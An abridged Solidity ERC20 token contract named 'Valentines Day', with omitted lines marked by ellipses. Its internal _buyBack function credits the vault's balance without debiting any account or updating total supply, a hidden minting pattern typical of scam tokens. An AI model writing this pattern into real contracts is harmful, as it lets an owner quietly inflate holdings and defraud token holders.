...
contract ValentinesDay is ERC20, VaultOwned {
    using SafeMath for uint256;
    bool private whitelistOnly;
    mapping(address => bool) public whitelist;

    constructor() ERC20('Valentines Day', 'VDay') {
        whitelistOnly = false;
        ...
        _mint(_msgSender(), 14022023 * 1e18);
    }
    ...
    function _buyBack(uint256 amount_) internal virtual {
        ...
        _balances[vault()] = _balances[vault()].add(amount_);
    }
}